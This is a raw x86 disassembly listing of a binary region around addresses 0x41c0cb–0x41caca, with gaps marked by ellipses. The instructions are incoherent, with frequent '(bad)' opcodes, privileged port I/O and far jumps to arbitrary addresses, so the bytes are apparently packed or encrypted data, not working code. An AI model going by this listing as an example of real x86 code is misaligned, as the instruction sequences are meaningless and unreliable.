  41c0cb:	mov    ds:0x610d35c9,al
  41c0d0:	jnp    0x41c121
  41c0d2:	pop    ebp
  41c0d3:	icebp  
  41c0d4:	add    eax,DWORD PTR [ebp+0x61569256]
  41c0da:	mov    edx,edi
  41c0dc:	mov    ecx,0xf86f2d25
  41c0e1:	pop    es
  41c0e2:	adc    DWORD PTR [ebx-0x11],edi
  41c0e5:	scas   al,BYTE PTR es:[edi]
  41c0e6:	cmp    esp,DWORD PTR [ebx+0x29]
  41c0e9:	push   edi
  41c0ea:	popa   
  41c0eb:	imul   ebx,DWORD PTR [ebx+0x1b],0x70
  41c0ef:	cmp    al,al
  41c0f1:	mov    ah,0x3b
  41c0f3:	inc    ecx
  41c0f4:	push   esi
  41c0f5:	scas   al,BYTE PTR es:[edi]
  41c0f6:	mov    al,ds:0xb6b35f78
  41c0fb:	mov    eax,0x9c536e7b
  41c100:	mov    edx,0x245115
  41c105:	cmp    al,0xe0
  41c107:	sahf   
  41c108:	or     bh,BYTE PTR [ebx]
  41c10a:	mov    eax,ds:0x5d55f44e
  41c10f:	sub    eax,0x0
	...
  41c174:	(bad)  [edx-0x5f]
  41c177:	clc    
  41c178:	mov    bl,0xfb
  41c17a:	fldcw  WORD PTR [ebx+0x3d]
  41c17d:	add    DWORD PTR ds:0x218d10e9,eax
  41c183:	stc    
  41c184:	cmp    BYTE PTR [edx],ch
  41c186:	add    DWORD PTR [eax],eax
  41c188:	add    al,0x1
  41c18a:	add    BYTE PTR [eax],al
  41c18c:	test   DWORD PTR [eax+0x39],edi
  41c18f:	push   ds
  41c190:	and    eax,0x1a1fefa2
  41c195:	popf   
  41c196:	fidivr DWORD PTR [edx+0x6878f1d0]
  41c19c:	jns    0x41c160
  41c19e:	ds leave 
  41c1a0:	sub    al,0x40
  41c1a2:	sbb    BYTE PTR [edx+0x3b],dl
  41c1a5:	leave  
  41c1a6:	fdivrp st(5),st
  41c1a8:	mov    edx,ds
  41c1aa:	fild   QWORD PTR [ebx]
  41c1ac:	lock pop esi
  41c1ae:	in     al,dx
  41c1af:	sahf   
  41c1b0:	jmp    0xcf366a2b
  41c1b5:	sbb    al,BYTE PTR ds:[eax-0xc]
  41c1b9:	mov    ah,0x8e
  41c1bb:	mov    bh,BYTE PTR [esi]
  41c1bd:	adc    ch,BYTE PTR [esi+0x2]
  41c1c0:	ja     0x41c226
  41c1c2:	mov    ds,WORD PTR [ecx+edx*1-0x323ba136]
  41c1c9:	mov    edx,0xe316e5f3
  41c1ce:	cmp    al,0x77
  41c1d0:	std    
  41c1d1:	ds xchg esi,eax
  41c1d3:	xchg   ebp,eax
  41c1d4:	jp     0x41c1c2
  41c1d6:	cdq    
  41c1d7:	call   0x98ff:0xeb351f5
  41c1de:	sbb    eax,0xcf97a0f3
  41c1e3:	shr    BYTE PTR [ecx],1
  41c1e5:	xlat   BYTE PTR ds:[ebx]
  41c1e6:	mov    bl,0x9a
  41c1e8:	pop    esp
  41c1e9:	pop    ecx
  41c1ea:	adc    al,0x36
  41c1ec:	bound  ecx,QWORD PTR [ecx-0x43]
  41c1ef:	cmp    DWORD PTR [edx+0x4a7ece03],esp
  41c1f5:	sar    DWORD PTR [ecx+0x55],1
  41c1f8:	jae    0x41c1e6
  41c1fa:	adc    dh,cl
  41c1fc:	(bad)  
  41c1fd:	pop    edx
  41c1fe:	ret    0x25c
  41c201:	xchg   DWORD PTR [ebx+ebp*2+0x49],edx
  41c205:	dec    edi
  41c206:	std    
  41c207:	mov    eax,0x54789288
  41c20c:	(bad)  
  41c20e:	enter  0xd7e4,0x62
  41c212:	dec    ebp
  41c213:	outs   dx,DWORD PTR ds:[esi]
  41c214:	push   ss
  41c215:	fidivr DWORD PTR [edx+0x6bb892fd]
  41c21b:	sub    dh,BYTE PTR [ecx-0x67ab59e3]
  41c221:	adc    al,0x4f
  41c223:	lea    esi,[ebp-0x61]
  41c226:	mov    ecx,0xa93776e2
  41c22b:	pop    esi
  41c22c:	pusha  
  41c22d:	mov    esi,0x26973d5b
  41c232:	pop    edx
  41c233:	inc    ebp
  41c234:	push   edx
  41c235:	sbb    edi,ebp
  41c237:	inc    ebx
  41c238:	ret    0x43b7
  41c23b:	xchg   edi,eax
  41c23c:	and    dl,BYTE PTR [esi+0x7f]
  41c23f:	ins    DWORD PTR es:[edi],dx
  41c240:	retf   0x1146
  41c243:	or     DWORD PTR [ebx+edx*4+0x788da7d3],ebp
  41c24a:	adc    bh,bh
  41c24c:	xchg   edx,eax
  41c24d:	or     DWORD PTR [edi],esi
  41c24f:	scas   al,BYTE PTR es:[edi]
  41c250:	mov    eax,0xf231406a
  41c255:	push   esi
  41c256:	add    DWORD PTR [edx-0x58a62654],esi
  41c25c:	daa    
  41c25d:	dec    edi
  41c25e:	call   0x4a9ab3e7
  41c263:	jp     0x41c2e1
  41c265:	add    eax,0x5019e8b4
  41c26a:	dec    ebx
  41c26b:	rol    BYTE PTR [eax-0x71abadfb],cl
  41c271:	jecxz  0x41c2cc
  41c273:	pop    ebp
  41c274:	icebp  
  41c275:	push   esp
  41c276:	lods   al,BYTE PTR ds:[esi]
  41c277:	enter  0x17ac,0x65
  41c27b:	and    ebx,DWORD PTR [esi+0x12]
  41c27e:	mov    edx,0x3538487b
  41c283:	xchg   esi,eax
  41c284:	addr16 das 
  41c286:	lods   eax,DWORD PTR ds:[esi]
  41c287:	ins    DWORD PTR es:[edi],dx
  41c288:	mov    dh,0xab
  41c28a:	bound  ebp,QWORD PTR [ebx+0x7686e2a5]
	...
  41c2f4:	repz and ebp,ecx
  41c2f7:	push   ebp
  41c2f8:	(bad)  
  41c2fa:	sti    
  41c2fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2fc:	enter  0x1a95,0x14
  41c300:	or     DWORD PTR [eax+0x2b3c24f3],eax
  41c306:	add    DWORD PTR [eax],eax
  41c308:	add    al,0x1
  41c30a:	add    BYTE PTR [eax],al
  41c30c:	adc    BYTE PTR [ecx-0x4dbbdeb9],cl
  41c312:	rol    BYTE PTR [edx+ebx*2],1
  41c315:	mov    ch,0x2f
  41c317:	in     eax,dx
  41c318:	cmp    al,ah
  41c31a:	inc    edi
  41c31b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c31c:	inc    ecx
  41c31d:	iret   
  41c31e:	ds lock jecxz 0x41c2ef
  41c322:	pop    es
  41c323:	or     bh,BYTE PTR [edx]
  41c325:	call   0x177c:0x5f3d0a95
  41c32c:	push   esi
  41c32d:	pavgw  mm1,QWORD PTR [esi-0x1d]
  41c331:	into   
  41c332:	sti    
  41c333:	loopne 0x41c34d
  41c335:	stos   DWORD PTR es:[edi],eax
  41c336:	push   ds
  41c337:	lods   al,BYTE PTR ds:[esi]
  41c338:	test   DWORD PTR [edi+0x31e0ca4c],eax
  41c33e:	sbb    eax,0xcea9d186
  41c343:	and    eax,0x85c582d
  41c348:	xchg   BYTE PTR [edi+0x45],bl
  41c34b:	int    0x50
  41c34d:	out    0x6c,eax
  41c34f:	jb     0x41c3cc
  41c351:	jne    0x41c39b
  41c353:	mov    al,0x4f
  41c355:	xchg   edx,eax
  41c356:	pop    ds
  41c357:	ss sar ecx,1
  41c35a:	loope  0x41c36f
  41c35c:	cmp    ebp,eax
  41c35e:	adc    bl,BYTE PTR ds:0xff70ed6d
  41c364:	in     eax,0x62
  41c366:	jmp    0x41c34c
  41c368:	lea    ebp,[edx+0x1cb97f43]
  41c36e:	sti    
  41c36f:	lods   al,BYTE PTR ds:[esi]
  41c370:	sub    bh,BYTE PTR [ecx]
  41c372:	pushf  
  41c373:	mov    esp,0x7f3ea77d
  41c378:	mov    cl,BYTE PTR [edi+eiz*2+0x24]
  41c37c:	dec    esp
  41c37d:	leave  
  41c37e:	rcl    DWORD PTR [eax+0x41846215],1
  41c384:	dec    edi
  41c385:	mov    DWORD PTR [edx+eax*1-0x55],esp
  41c389:	ins    DWORD PTR es:[edi],dx
  41c38a:	mov    ebp,0x15444e49
  41c38f:	popa   
  41c390:	mov    BYTE PTR [esp+ebx*1-0x56],bh
  41c394:	xchg   esi,eax
  41c395:	xor    BYTE PTR [eax+0x1a],0x99
  41c399:	pusha  
  41c39a:	sub    edx,DWORD PTR [esi-0x655a3539]
  41c3a0:	ror    BYTE PTR gs:[ebx-0x42611229],0x8a
  41c3a8:	xor    edx,ebx
  41c3aa:	popa   
  41c3ab:	mov    eax,ds:0xd9d884d0
  41c3b0:	ja     0x41c3cb
  41c3b2:	sub    cl,0x5b
  41c3b5:	in     eax,dx
  41c3b6:	jl     0x41c3b3
  41c3b8:	xor    al,0x26
  41c3ba:	(bad)  
  41c3bb:	or     al,0xdc
  41c3bd:	lahf   
  41c3be:	loopne 0x41c40e
  41c3c0:	std    
  41c3c1:	aam    0x29
  41c3c3:	shl    dl,cl
  41c3c5:	mov    esp,DWORD PTR ds:0x7d748ede
  41c3cb:	out    dx,eax
  41c3cc:	pop    edi
  41c3cd:	test   BYTE PTR [eax],0xe5
  41c3d0:	mov    al,ds:0x65e2e494
  41c3d5:	lods   al,BYTE PTR ds:[esi]
  41c3d6:	jmp    0x31d91e8a
  41c3db:	in     eax,0x51
  41c3dd:	aaa    
  41c3de:	mov    al,0x8e
  41c3e0:	repz or eax,0x97a61d4
  41c3e6:	stos   DWORD PTR es:[edi],eax
  41c3e7:	stos   BYTE PTR es:[edi],al
  41c3e8:	jmp    FWORD PTR [esi]
  41c3ea:	je     0x41c3c9
  41c3ec:	inc    eax
  41c3ed:	loopne 0x41c371
  41c3ef:	cmovae esp,DWORD PTR [edx-0x79896224]
  41c3f6:	xlat   BYTE PTR ds:[ebx]
  41c3f7:	pop    esp
  41c3f8:	or     bh,bl
  41c3fa:	btr    DWORD PTR [ecx-0x4e],ebp
  41c3fe:	cmp    eax,0xb188d960
  41c403:	mov    eax,esp
  41c405:	(bad)  
  41c406:	ins    BYTE PTR es:[edi],dx
  41c407:	sub    esp,DWORD PTR [ecx-0x28]
  41c40a:	pop    ds
  41c40b:	sahf   
  41c40c:	das    
  41c40d:	in     eax,dx
  41c40e:	les    ecx,FWORD PTR [eax+eax*1+0x0]
	...
  41c472:	add    BYTE PTR [eax],al
  41c474:	push   ebx
  41c475:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c47b:	std    
  41c47c:	mov    bl,0x35
  41c47e:	dec    ebp
  41c47f:	push   ecx
  41c480:	mov    bl,0xe8
  41c482:	shr    BYTE PTR [esi+0x12c40],1
  41c488:	add    al,0x1
  41c48a:	add    BYTE PTR [eax],al
  41c48c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c48d:	or     BYTE PTR [edx+0x3ea256e9],ch
  41c493:	pop    eax
  41c494:	lods   al,BYTE PTR ds:[esi]
  41c495:	inc    esp
  41c496:	cmp    esi,edi
  41c498:	adc    BYTE PTR [edi-0x1728e0c],cl
  41c49e:	and    BYTE PTR [ebx],al
  41c4a0:	sub    DWORD PTR [esi],ecx
  41c4a2:	xlat   BYTE PTR ds:[ebx]
  41c4a3:	bound  ebp,QWORD PTR [esi-0x16fd867c]
  41c4a9:	mov    bh,0xb
  41c4ac:	repz popf 
  41c4ae:	std    
  41c4af:	imul   ebx,ebx,0xbdcb2ae
  41c4b5:	enter  0xda7b,0x46
  41c4b9:	(bad)  
  41c4ba:	mov    ebx,0x1a372600
  41c4bf:	outs   dx,BYTE PTR ds:[esi]
  41c4c0:	adc    DWORD PTR [ecx-0x7c],ebx
  41c4c3:	jae    0x41c453
  41c4c5:	rol    DWORD PTR [esi],1
  41c4c7:	cmp    eax,edi
  41c4c9:	sti    
  41c4ca:	add    edi,DWORD PTR [edi+0x6d]
  41c4cd:	sbb    DWORD PTR [esi+0xa],eax
  41c4d0:	dec    ebp
  41c4d1:	mov    bl,0x61
  41c4d3:	mov    esi,0xc98ae75
  41c4d8:	add    dl,cl
  41c4da:	cmp    DWORD PTR [eax+0x736a8760],ebx
  41c4e0:	dec    ebp
  41c4e1:	fisttp DWORD PTR [ebp+0x504a4fda]
  41c4e7:	jle    0x41c4f0
  41c4e9:	stc    
  41c4ea:	pop    edi
  41c4eb:	push   cs
  41c4ec:	les    ebx,FWORD PTR [eax]
  41c4ee:	icebp  
  41c4ef:	mov    WORD PTR [eax],ss
  41c4f1:	out    0xa1,eax
  41c4f3:	mov    eax,0x5263237c
  41c4f8:	pop    edx
  41c4f9:	dec    edx
  41c4fa:	add    eax,0x54ea8990
  41c4ff:	push   ds
  41c500:	push   esi
  41c501:	or     al,0x74
  41c503:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c504:	loope  0x41c533
  41c506:	xor    BYTE PTR [esi+0x632bf0ba],0xae
  41c50d:	jb     0x41c546
  41c50f:	daa    
  41c510:	adc    bl,bl
  41c512:	out    0x3e,eax
  41c514:	cmp    bh,BYTE PTR [esi]
  41c516:	sahf   
  41c517:	ror    DWORD PTR [edx+0x1],cl
  41c51a:	sbb    al,0x1e
  41c51c:	sub    al,0x1a
  41c51e:	mov    dl,0xdf
  41c520:	(bad)  
  41c521:	ror    BYTE PTR [edx+0x45],1
  41c524:	xor    ebx,DWORD PTR [ebp+0x4569e0e6]
  41c52a:	push   es
  41c52b:	xchg   esp,eax
  41c52c:	pop    edx
  41c52d:	psllq  mm1,mm0
  41c530:	lahf   
  41c531:	icebp  
  41c532:	push   ebx
  41c533:	mov    cl,0x23
  41c535:	jg     0x41c563
  41c537:	jecxz  0x41c4d8
  41c539:	leave  
  41c53a:	cmc    
  41c53b:	jmp    0x41c4c2
  41c53d:	mov    esi,0xa4e57b06
  41c542:	cmc    
  41c543:	mov    eax,ds:0xf6b550ab
  41c548:	cmc    
  41c549:	push   ss
  41c54a:	and    esi,eax
  41c54c:	ret    
  41c54d:	mov    dh,0xa3
  41c54f:	js     0x41c5c2
  41c551:	cmp    eax,0x1114c97b
  41c556:	out    dx,al
  41c557:	xchg   BYTE PTR [ebx-0x35],bl
  41c55a:	sbb    DWORD PTR [ebp-0x33],edx
  41c55d:	ja     0x41c5aa
  41c55f:	mov    eax,0xd978308f
  41c564:	stos   BYTE PTR es:[edi],al
  41c565:	or     dl,BYTE PTR [ecx]
  41c567:	xchg   esp,eax
  41c568:	dec    edi
  41c569:	adc    cl,ch
  41c56b:	push   ss
  41c56c:	or     BYTE PTR [ebx+0x70a40b53],dl
  41c572:	fidiv  DWORD PTR [ebp+ecx*1+0x6]
  41c576:	pop    ebx
  41c577:	xchg   ebp,eax
  41c578:	mov    cl,0x41
  41c57a:	push   es
  41c57b:	sub    ah,ch
  41c57d:	sbb    DWORD PTR [ebx+eiz*8],ebx
  41c580:	fs mov edi,0xf50fc3f5
  41c586:	sbb    eax,0x61d4b279
  41c58b:	mov    dl,0xa5
  41c58d:	js     0x41c60b
  41c58f:	test   BYTE PTR [eax],al
	...
  41c5f1:	add    BYTE PTR [eax],al
  41c5f3:	add    ch,al
  41c5f5:	and    edx,DWORD PTR [ecx-0xa4808db]
  41c5fb:	jecxz  0x41c640
  41c5fd:	and    ch,ch
  41c5ff:	call   0x2d44:0x7155629
  41c606:	add    DWORD PTR [eax],eax
  41c608:	add    al,0x1
  41c60a:	add    BYTE PTR [eax],al
  41c60c:	sub    DWORD PTR [edi+0x6c],esp
  41c60f:	pop    ebp
  41c610:	fiadd  DWORD PTR [ecx-0x43cba18e]
  41c616:	iret   
  41c617:	cmp    edi,DWORD PTR [eax]
  41c619:	mov    eax,0xec7ff96b
  41c61e:	sub    cl,0x43
  41c621:	add    dh,BYTE PTR ds:0x7a8adff7
  41c627:	xchg   DWORD PTR [ecx],edx
  41c629:	aam    0x90
  41c62b:	cli    
  41c62c:	lock jg 0x41c5d0
  41c62f:	mov    al,0x69
  41c631:	fcom   DWORD PTR [edx-0x58c9b508]
  41c637:	addr16 cmp al,0xa9
  41c63a:	cmc    
  41c63b:	nop
  41c63c:	fidiv  WORD PTR [ebx]
  41c63e:	add    DWORD PTR [eax-0x5d20c99c],ebx
  41c644:	mov    cl,0x6d
  41c646:	push   0x20
  41c648:	push   esi
  41c649:	out    0x60,eax
  41c64b:	inc    eax
  41c64c:	xor    ch,BYTE PTR [ebx]
  41c64e:	add    eax,0xbc4f2234
  41c653:	shl    DWORD PTR [edx+0x5f],cl
  41c656:	sub    al,0xbc
  41c658:	push   esp
  41c659:	jnp    0x41c5f6
  41c65b:	hlt    
  41c65c:	mov    esi,0x5378bce8
  41c661:	aam    0x56
  41c663:	fistp  WORD PTR [eax-0x16]
  41c666:	and    al,0x1
  41c668:	ins    BYTE PTR es:[edi],dx
  41c669:	sub    DWORD PTR [esi+0x520327a0],ebx
  41c66f:	inc    esp
  41c670:	sbb    al,dl
  41c672:	sbb    eax,0xb25b2fa7
  41c677:	fbstp  TBYTE PTR [ecx-0x5763070b]
  41c67d:	and    DWORD PTR [ebx-0x54],ecx
  41c680:	jmp    0x442c:0x16147129
  41c687:	ret    0x4520
  41c68a:	shl    BYTE PTR [edi],0xf2
  41c68d:	sbb    dl,BYTE PTR [ebx-0x25f74c25]
  41c693:	in     eax,0x8d
  41c695:	jmp    0xaffd6fe1
  41c69a:	or     bh,BYTE PTR [edx]
  41c69c:	and    bl,BYTE PTR [esi+0x616f0229]
  41c6a2:	adc    DWORD PTR [ebx],eax
  41c6a4:	clc    
  41c6a5:	fld    QWORD PTR [esi]
  41c6a7:	add    edi,DWORD PTR [edi+edi*1]
  41c6aa:	and    al,0xbd
  41c6ac:	cmc    
  41c6ad:	ja     0x41c71c
  41c6af:	loopne 0x41c6ca
  41c6b1:	gs dec esp
  41c6b3:	mov    eax,ds:0x20172369
  41c6b8:	scas   eax,DWORD PTR es:[edi]
  41c6b9:	add    eax,edx
  41c6bb:	test   al,0x5e
  41c6bd:	mov    ecx,0x8e6cc660
  41c6c2:	push   eax
  41c6c3:	xor    eax,edx
  41c6c5:	push   ebx
  41c6c6:	lds    ecx,FWORD PTR [ebx+edx*2+0x2dd00716]
  41c6cd:	jne    0x41c67d
  41c6cf:	ins    DWORD PTR es:[edi],dx
  41c6d0:	sahf   
  41c6d1:	pop    ds
  41c6d2:	cmp    DWORD PTR [edx+0xe66b6f9],edi
  41c6d8:	jae    0x41c6ae
  41c6da:	ins    BYTE PTR es:[edi],dx
  41c6db:	pushf  
  41c6dc:	mov    al,ds:0x90f6177c
  41c6e1:	(bad)  
  41c6e3:	loop   0x41c750
  41c6e5:	clc    
  41c6e6:	out    dx,al
  41c6e7:	sub    dl,BYTE PTR [ebp-0x75]
  41c6ea:	xor    cl,dh
  41c6ec:	inc    ebx
  41c6ed:	ins    DWORD PTR es:[edi],dx
  41c6ee:	adc    ebx,DWORD PTR [edx]
  41c6f0:	outs   dx,BYTE PTR ds:[esi]
  41c6f1:	push   ss
  41c6f2:	sub    al,0x62
  41c6f4:	imul   esp,DWORD PTR [edi+0x221edc87],0x74647f19
  41c6fe:	xor    DWORD PTR [eax-0x45665817],edi
  41c704:	or     al,0x3e
  41c706:	push   cs
  41c707:	xchg   ecx,eax
  41c708:	pop    ss
  41c709:	add    eax,0xacf7a087
  41c70e:	cmp    eax,0x9f
	...
  41c773:	add    dl,bl
  41c775:	add    edx,eax
  41c777:	xchg   bl,bl
  41c779:	(bad)  
  41c77a:	ficomp WORD PTR [ebp-0xf]
  41c77d:	cmp    DWORD PTR [esi],esi
  41c77f:	lahf   
  41c780:	pop    ebp
  41c781:	rcl    BYTE PTR [ebx+0x3d],cl
  41c784:	dec    eax
  41c785:	add    DWORD PTR cs:[eax],eax
  41c788:	add    al,0x1
  41c78a:	add    BYTE PTR [eax],al
  41c78c:	aam    0x97
  41c78e:	pop    ebx
  41c78f:	inc    edi
  41c790:	popa   
  41c791:	mov    ebp,0xaba87909
  41c796:	aaa    
  41c797:	xor    dh,BYTE PTR [ebx-0x150fff5f]
  41c79d:	add    DWORD PTR [esi],edx
  41c79f:	mov    ecx,edx
  41c7a1:	imul   ebp,DWORD PTR [edx],0xfffffff9
  41c7a4:	inc    edx
  41c7a5:	cmp    BYTE PTR [ebp-0x6e89edc5],0x4e
  41c7ac:	das    
  41c7ad:	retf   
  41c7ae:	push   es
  41c7af:	in     eax,0x72
  41c7b1:	out    dx,eax
  41c7b2:	icebp  
  41c7b3:	mov    ds:0x62398dc7,al
  41c7b8:	xchg   ebp,eax
  41c7b9:	div    DWORD PTR [eax]
  41c7bb:	mov    ds:0x5301fe9f,eax
  41c7c0:	fcom   QWORD PTR [ecx]
  41c7c2:	pop    esi
  41c7c3:	in     al,dx
  41c7c4:	pop    es
  41c7c5:	dec    esi
  41c7c6:	xchg   edi,eax
  41c7c7:	xor    al,0x98
  41c7c9:	mov    esi,0xfcbb2a3
  41c7ce:	stc    
  41c7cf:	aaa    
  41c7d0:	or     eax,0xde9f20d1
  41c7d5:	pop    es
  41c7d6:	mov    ds,WORD PTR [esi+0x18]
  41c7d9:	inc    esi
  41c7da:	mov    ah,0xd5
  41c7dc:	cmp    eax,esp
  41c7de:	lods   eax,DWORD PTR ds:[esi]
  41c7df:	sbb    esp,DWORD PTR [eax-0x2e71b9db]
  41c7e5:	fiadd  WORD PTR [ebp+ebp*4-0x5d7d0bfa]
  41c7ec:	mov    ds:0x92a0c3a8,eax
  41c7f1:	push   0x3
  41c7f3:	aas    
  41c7f4:	or     DWORD PTR ds:0x9b731bbb,esp
  41c7fa:	jbe    0x41c7ae
  41c7fc:	cwde   
  41c7fd:	mov    bl,BYTE PTR [edi]
  41c7ff:	adc    al,0x64
  41c801:	(bad)  
  41c803:	xor    al,0x18
  41c805:	jno    0x41c826
  41c807:	out    dx,al
  41c808:	or     eax,0xb4e5bab3
  41c80d:	add    eax,0xf2152c9c
  41c812:	xchg   DWORD PTR ss:[esi-0x5d],ecx
  41c816:	loope  0x41c84f
  41c818:	adc    al,0xfb
  41c81a:	ins    BYTE PTR es:[edi],dx
  41c81b:	sbb    BYTE PTR [ecx+eiz*8+0x13e54458],0xb6
  41c823:	cdq    
  41c824:	ins    DWORD PTR es:[edi],dx
  41c825:	(bad)  [edi]
  41c827:	shl    BYTE PTR [ebx],1
  41c829:	jge    0x41c851
  41c82b:	je     0x41c7d7
  41c82d:	xchg   BYTE PTR [ecx],ch
  41c82f:	je     0x41c885
  41c831:	pop    ss
  41c832:	pop    ecx
  41c833:	add    al,BYTE PTR [edi+0x6ed422ae]
  41c839:	mov    ah,0xf5
  41c83b:	cmp    edi,DWORD PTR es:[ebx-0x45]
  41c83f:	and    DWORD PTR cs:[ebp+0x5e],ebx
  41c843:	mov    ds:0xdb165a28,al
  41c848:	scas   al,BYTE PTR es:[edi]
  41c849:	lahf   
  41c84a:	mov    ebx,DWORD PTR [edx-0xf]
  41c84d:	sub    eax,0x842fd10f
  41c852:	(bad)  
  41c853:	jb     0x41c7e7
  41c855:	mov    bh,0x5d
  41c857:	or     al,0x38
  41c859:	lahf   
  41c85a:	jp     0x41c8b1
  41c85c:	loopne 0x41c80d
  41c85e:	jp     0x41c840
  41c860:	in     eax,0x75
  41c862:	cld    
  41c863:	or     BYTE PTR [esi+ebp*8-0x58],0xe4
  41c868:	dec    ebx
  41c869:	cmp    bl,BYTE PTR [ebx]
  41c86b:	mov    esp,0x4a3c9e1d
  41c870:	xor    BYTE PTR [ecx-0x1f71a070],al
  41c876:	retf   0x3825
  41c879:	in     eax,dx
  41c87a:	leave  
  41c87b:	(bad)  
  41c87c:	scas   al,BYTE PTR es:[edi]
  41c87d:	xor    bl,BYTE PTR [ebx-0x5d]
  41c880:	mov    DWORD PTR [edi-0x88bc480],ebx
  41c886:	stos   BYTE PTR es:[edi],al
  41c887:	hlt    
  41c888:	cmp    bl,bl
  41c88a:	popa   
  41c88b:	or     al,0x2
  41c88d:	sahf   
  41c88e:	(bad)  
  41c88f:	mov    es,WORD PTR [eax]
	...
  41c8f1:	add    BYTE PTR [eax],al
  41c8f3:	add    BYTE PTR [ebx+0x34],ah
  41c8f6:	lods   eax,DWORD PTR ds:[esi]
  41c8f7:	xor    al,0xff
  41c8f9:	mov    ebp,0x291877fb
  41c8fe:	cmp    eax,DWORD PTR [ecx]
  41c900:	sbb    eax,0x4c7f0d36
  41c905:	das    
  41c906:	add    DWORD PTR [eax],eax
  41c908:	add    al,0x1
  41c90a:	add    BYTE PTR [eax],al
  41c90c:	div    BYTE PTR [edi-0x664f376c]
  41c912:	push   edx
  41c913:	int3   
  41c914:	rol    BYTE PTR [esi],1
  41c916:	dec    esi
  41c917:	xchg   DWORD PTR [ebx+eiz*2],eax
  41c91a:	clc    
  41c91b:	aad    0xb0
  41c91d:	out    0x3f,al
  41c91f:	test   eax,0x5e232a97
  41c924:	ret    0xfd27
  41c927:	shr    ah,0xc9
  41c92a:	xor    al,0x5a
  41c92c:	test   ah,bl
  41c92e:	or     BYTE PTR [ecx+0x7cb9a383],bh
  41c934:	jb     0x41c8c8
  41c936:	aaa    
  41c937:	fwait
  41c938:	xor    edx,DWORD PTR [edx*8+0x3e5adc97]
  41c93f:	lea    edi,[eax]
  41c941:	into   
  41c942:	ret    
  41c943:	das    
  41c944:	pushf  
  41c945:	sub    ah,cl
  41c947:	sbb    ecx,DWORD PTR [ebx]
  41c949:	aas    
  41c94a:	jmp    0xf166:0x8b0a558a
  41c951:	add    eax,0x4fa6c128
  41c956:	call   0x8a50:0xf393213
  41c95d:	mov    al,0x2e
  41c95f:	sti    
  41c960:	ror    edx,0x38
  41c963:	mov    cs,WORD PTR [eax+ebx*2]
  41c966:	mov    ds:0xd7945d88,al
  41c96b:	and    al,0x85
  41c96d:	or     BYTE PTR [ecx],0x61
  41c970:	mov    ebp,DWORD PTR [edi]
  41c972:	gs inc ebp
  41c974:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c975:	ins    DWORD PTR es:[edi],dx
  41c976:	jnp    0x41c905
  41c978:	sbb    BYTE PTR [edi],dl
  41c97a:	inc    ebp
  41c97b:	ins    BYTE PTR es:[edi],dx
  41c97c:	out    0x61,eax
  41c97e:	or     ch,dh
  41c980:	mov    al,0x4d
  41c982:	inc    edx
  41c983:	push   ebx
  41c984:	(bad)
  41c987:	xchg   BYTE PTR [ebp+eax*4-0x32],al
  41c98b:	push   edx
  41c98c:	fmulp  st(7),st
  41c98e:	push   edx
  41c98f:	or     al,0x36
  41c991:	data16 jne 0x41c9a1
  41c994:	aas    
  41c995:	pop    esi
  41c996:	jmp    0xae5:0x2c55b9e0
  41c99d:	sub    al,0x9d
  41c99f:	out    dx,al
  41c9a0:	ror    ecx,0x96
  41c9a3:	ins    BYTE PTR es:[edi],dx
  41c9a4:	addr16 push ds
  41c9a6:	dec    ebx
  41c9a7:	push   ebx
  41c9a8:	int    0x9
  41c9aa:	out    dx,al
  41c9ab:	and    bl,ch
  41c9ad:	add    ebp,esi
  41c9af:	mov    edx,0x7f487934
  41c9b4:	mov    dl,0x6a
  41c9b6:	inc    edi
  41c9b7:	cmp    eax,0xcb0fe0d5
  41c9bc:	sti    
  41c9bd:	xchg   esi,eax
  41c9be:	dec    ecx
  41c9bf:	inc    edx
  41c9c0:	sbb    al,0x3e
  41c9c2:	fs and al,0x4f
  41c9c5:	dec    edi
  41c9c6:	daa    
  41c9c7:	lods   al,BYTE PTR ds:[esi]
  41c9c8:	and    eax,0xfab6e249
  41c9cd:	arpl   WORD PTR [ebx],cx
  41c9cf:	push   0xbca4551
  41c9d4:	sbb    BYTE PTR [ecx],0x51
  41c9d7:	lea    edi,[esi-0x894a24b]
  41c9dd:	and    bh,BYTE PTR [ebx]
  41c9df:	test   BYTE PTR [edi+0x16782ce1],al
  41c9e5:	jmp    0x41ca5c
  41c9e7:	in     al,0x1
  41c9e9:	push   ss
  41c9ea:	hlt    
  41c9eb:	cli    
  41c9ec:	lds    eax,FWORD PTR [ebp-0x7e]
  41c9ef:	push   ebx
  41c9f0:	sub    ebp,DWORD PTR [edx-0x2d]
  41c9f3:	push   edx
  41c9f4:	frstor [ebx-0x63832de]
  41c9fa:	adc    BYTE PTR ds:0x282d37e7,ch
  41ca00:	inc    ecx
  41ca01:	cmp    BYTE PTR [edi],ch
  41ca03:	adc    al,0xae
  41ca05:	jbe    0x41c9d7
  41ca07:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ca08:	xor    al,0xa0
  41ca0a:	shr    DWORD PTR [ecx+0x4f6a8336],cl
	...
  41ca74:	lock retf 0xfc94
  41ca78:	mov    esi,0xc1cef8fe
  41ca7d:	or     al,BYTE PTR [ebx+0x0]
  41ca80:	xchg   ebp,eax
  41ca81:	lods   al,BYTE PTR ds:[esi]
  41ca82:	xor    BYTE PTR [ecx+0x50],0x30
  41ca86:	add    DWORD PTR [eax],eax
  41ca88:	add    al,0x1
  41ca8a:	add    BYTE PTR [eax],al
  41ca8c:	mov    ?,edi
  41ca8e:	and    eax,0xf66a614d
  41ca93:	test   esp,0x3831c709
  41ca99:	inc    eax
  41ca9a:	adc    eax,DWORD PTR [ecx+0x59284f18]
  41caa0:	xchg   ebp,eax
  41caa1:	push   es
  41caa2:	stos   DWORD PTR es:[edi],eax
  41caa3:	jb     0x41cad5
  41caa5:	fst    st(5)
  41caa7:	sub    eax,0xd1c36ae8
  41caac:	jo     0x41ca2f
  41caae:	ret    
  41caaf:	add    dh,BYTE PTR [esp+ecx*4]
  41cab2:	dec    ebx
  41cab3:	pop    esi
  41cab4:	mov    al,ds:0x1a17548d
  41cab9:	push   ebp
  41caba:	js     0x41cb23
  41cabc:	mov    esp,0x1d66a7e4
  41cac1:	in     eax,dx
  41cac2:	push   ecx
  41cac3:	fnstsw WORD PTR [eax]
  41cac5:	popf   
  41cac6:	push   ecx
  41cac7:	int    0xc3
  41cac9:	pushf  
  41caca:	lods   eax,DWORD PTR ds:[esi]
